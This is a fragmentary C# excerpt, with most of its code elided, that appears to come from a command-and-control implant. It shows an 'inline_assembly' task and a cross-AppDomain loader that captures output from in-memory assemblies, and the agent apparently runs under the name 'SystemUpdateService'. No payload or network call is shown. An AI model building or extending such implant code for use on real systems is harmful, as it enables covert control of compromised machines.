    ...
    public class inline_assembly : Tasking
    {
        ...
        public override void Start()
        {
            ...
            try
            {
                ...
                {
                    resp = CreateTaskResponse("Failed to get SystemInterop dependency.", true, "error");
                }
            }
            catch (Exception ex)
            {
...
#region Cross AppDomain Loader
        static void ActivateLoader()
        {
            void OnWrite(object sender, object args)
            {
                ...
                {
                    if (asm2.FullName.StartsWith("SystemInterop"))
                    {
                        interop2 = asm2;
                        break;
                    }
                ...
                Type tStringEventArgs = interop2.GetType("SystemInterop.Classes.Events.StringDataEventArgs");
            ...
            {
                if (asm.FullName.StartsWith("SystemInterop"))
                {
                    interopAsm = asm;
                }
            }
            ...
            Type tWriter = interopAsm.GetType("SystemInterop.Classes.IO.EventableStringWriter");
            ...
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("SystemUpdateService"))
                {
